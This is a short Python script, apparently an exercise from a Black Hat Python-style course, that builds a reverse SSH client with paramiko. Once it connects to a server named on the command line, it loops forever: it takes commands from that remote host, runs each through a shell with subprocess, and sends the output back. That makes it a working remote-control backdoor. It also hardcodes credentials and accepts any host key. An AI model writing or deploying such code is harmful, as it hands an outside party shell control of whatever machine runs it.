import threading
import paramiko
import subprocess
import sys

# This script pairs with the bh_sshserver
# This client will connect with the server and wait for commands
# from the server to execute client-side

def ssh_command(ip, port, user, passwd, command):
    
    # create the ssh client using paramiko library
    client = paramiko.SSHClient()
    
    # load hostkeys from known_hosts file
    client.load_host_keys('/home/sjbavier/.ssh/known_hosts')
    
    # set the policy for updating host keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # connect to ip with username and password from arguments
    client.connect(ip, port=port, username=user, password=passwd)
    
    # using client get the transport object and
    # request new session from server
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
            
            # send the command through the session
            ssh_session.send(command)

            # print the received data in utf-8 'banner'
            print(ssh_session.recv(1024).decode('utf-8'))

            while True:
                # get command from ssh server
                command = ssh_session.recv(1024).decode('utf-8')

                try:
                    # 
                    cmd_output = subprocess.check_output(command, shell=True)
                    ssh_session.send(cmd_output)

                except Exception as e:
                    ssh_session.send(str(e))
            
            client.close()
    return

# incorportate CLI arguments            
server = sys.argv[1]
ssh_port = int(sys.argv[2])
# user = sys.argv[3]
# passwd = sys.argv[4]

ssh_command(server, ssh_port, 'userA', 'passwd', 'ClientConnected')
            